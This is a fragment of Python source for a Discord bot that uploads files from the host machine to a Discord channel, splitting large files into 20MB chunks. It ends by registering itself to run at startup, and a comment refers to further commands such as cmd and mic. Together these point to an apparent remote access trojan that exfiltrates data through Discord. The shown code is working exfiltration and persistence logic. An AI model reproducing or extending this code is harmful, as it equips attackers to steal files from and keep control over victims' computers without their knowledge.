                chunk_size = 20 * 1024 * 1024  # 20MB chunks
                chunks = []
                with open(filepath, 'rb') as f:
                    chunk_num = 0
                    while True:
                        chunk = f.read(chunk_size)
                        if not chunk:
                            break
                        chunk_num += 1
                        chunk_path = f"{filepath}.part{chunk_num:03d}"
                        with open(chunk_path, 'wb') as cf:
                            cf.write(chunk)
                        chunks.append(chunk_path)
                
                # Send chunks with delay
                for i, chunk_path in enumerate(chunks):
                    await ctx.send(file=discord.File(chunk_path))
                    os.remove(chunk_path)
                    if i < len(chunks) - 1:
                        await asyncio.sleep(1)
                
                await send_embed(ctx, "✅ Done", f"File split into {len(chunks)} parts", discord.Color.green())
                return
            
            # Small file - send directly
            await ctx.send(file=discord.File(filepath))
        else:
            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== REST OF COMMANDS (listfiles, cmd, mic, etc.) ==========
# ... (your existing commands continue here)

if __name__ == "__main__":
    if Config.STARTUP:
        add_to_startup()
    bot.run(Config.TOKEN)
